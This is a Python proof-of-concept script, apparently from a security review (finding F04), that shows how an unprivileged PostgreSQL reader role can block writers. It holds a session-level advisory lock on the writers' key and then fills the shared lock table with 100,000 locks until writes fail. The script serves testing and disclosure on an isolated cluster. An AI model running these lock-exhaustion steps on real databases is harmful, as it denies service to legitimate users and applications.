#!/usr/bin/env python3
"""F04: читатель без единого допуска (ac_rd_none, член только ac_reader) останавливает писателей.
(а) адресно: pg_advisory_lock() уровня СЕАНСА по тому же ключу, что берут стражи (hashtextextended('entity:<id>', 7));
    сеанс читателя простаивает ВНЕ транзакции — блокировка держится, запись об этой сущности висит без срока
    (lock_timeout = 0). Ключ можно и не знать: pg_locks показывает ключи блокировок, взятых писателями.
(б) глобально: тот же читатель заполняет общую таблицу блокировок — любая запись ядра получает «out of shared memory».
Запускать на отдельном кластере: PGHOST=/home/claude/rev_pg PGPORT=5438 PGDATABASE=rev2 python3 f04_reader_dos.py"""
import subprocess, os, time
ENV = dict(os.environ)
def run(sql, user):
    r = subprocess.run(["psql", "-X", "-q", "-At", "-U", user], input=sql, capture_output=True, text=True, env=ENV)
    return " / ".join(l.strip() for l in (r.stdout + r.stderr).strip().splitlines())[:420]
def sess(user):
    return subprocess.Popen(["psql", "-X", "-q", "-At", "-U", user], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, env=ENV)
def claim(tag, timeout):
    return f"""SET statement_timeout = '{timeout}';
INSERT INTO ac.claims (claim_id, project_id, tenant_id, subject, predicate, object_entity, produced_kind, recorded_at, marking, body)
SELECT b->>'claim_id', c.project_id, c.tenant_id, c.subject, c.predicate, NULL, c.produced_kind, (b->>'recorded_at')::timestamptz, c.marking, b
FROM (SELECT * FROM ac.claims WHERE predicate = 'wiki.property' AND subject = 'ent_wk_blue' ORDER BY claim_id LIMIT 1) c,
     LATERAL (SELECT c.body || jsonb_build_object('claim_id', 'clm:sha256:' || encode(sha256(convert_to('{tag}' || clock_timestamp(), 'UTF8')), 'hex'),
                     'recorded_at', to_char(now() AT TIME ZONE 'UTC', 'YYYY-MM-DD"T"HH24:MI:SS"Z"')) AS b) x
RETURNING 'OK: утверждение записано';"""
print("права читателя:", run("SELECT 'session_user=' || session_user || ', SELECT на таблицы ac: ' || (SELECT count(*) FROM pg_class c WHERE relnamespace = 'ac'::regnamespace AND relkind = 'r' AND has_table_privilege(c.oid, 'SELECT'))", "ac_rd_none"))
print("\n(а) контроль — писатель ac_app до атаки:", run(claim("ctl", "5s"), "ac_app"))
r = sess("ac_rd_none")
r.stdin.write("SELECT 'R: сеансовая блокировка взята, pid=' || pg_backend_pid() FROM (SELECT pg_advisory_lock(hashtextextended('entity:ent_wk_blue', 7))) x;\n"); r.stdin.flush()
print(r.stdout.readline().strip())
w = sess("ac_app"); w.stdin.write(claim("dos", "6s") + "\n"); w.stdin.flush()
time.sleep(2)
print("pg_locks через 2 c:", run("""SELECT a.usename || ' pid=' || l.pid || ' ' || l.mode || ' granted=' || l.granted || ' xact=' || coalesce(a.xact_start::text, 'нет транзакции') || ' state=' || a.state
  FROM pg_locks l JOIN pg_stat_activity a USING (pid) WHERE l.locktype = 'advisory' AND l.database = (SELECT oid FROM pg_database WHERE datname = current_database()) ORDER BY l.granted DESC""", "postgres"))
w.stdin.close(); print("писатель ac_app (statement_timeout 6 c только чтобы пример завершился):", " / ".join(w.stdout.read().strip().splitlines())[:300]); w.wait()
r.stdin.close(); r.wait()
print("после отключения читателя:", run(claim("after", "5s"), "ac_app"))

print("\n(б) читатель заполняет общую таблицу блокировок сеансовыми блокировками")
r = sess("ac_rd_none")
r.stdin.write("SELECT count(pg_advisory_lock(g)) FROM generate_series(1, 100000) g;\nSELECT 'R: держит сеансовых блокировок: ' || count(*) FROM pg_locks WHERE pid = pg_backend_pid() AND locktype = 'advisory';\n"); r.stdin.flush()
print(r.stdout.readline().strip()[:120]); r.stdout.readline(); print(r.stdout.readline().strip())
print("писатель ac_app:", run(claim("oom", "5s"), "ac_app")[:260])
print("проекция с блокировкой (ac.model) у читателя с допуском:", run("SELECT left(ac.model('prj_wiki_whales')::text, 60)", "ac_rd_full")[:200])
r.stdin.close(); r.wait(); time.sleep(0.5)
print("после отключения читателя:", run(claim("after2", "5s"), "ac_app"))
